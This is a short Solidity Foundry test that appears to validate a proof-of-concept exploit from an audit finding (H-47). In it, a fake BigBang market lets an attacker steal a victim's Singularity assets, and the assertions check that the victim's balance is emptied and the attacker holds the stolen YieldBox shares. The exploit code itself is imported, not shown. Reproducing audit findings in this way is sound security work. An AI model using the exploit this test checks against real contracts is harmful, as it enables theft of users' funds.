// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./27537-h-47-users-assets-can-be-stolen-when-removing-them-from-the.sol";

contract FakeBigBangStealTest is Test {
    function test_fake_bigbang_steals_singularity_assets() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.sgl().balanceOf(exp.VICTIM()), 0, "victim SGL empty");
        assertEq(
            exp.yieldBox().balanceOf(exp.ASSET_ID(), exp.ATTACKER()),
            exp.VICTIM_SHARES(),
            "attacker holds stolen shares"
        );
    }
}
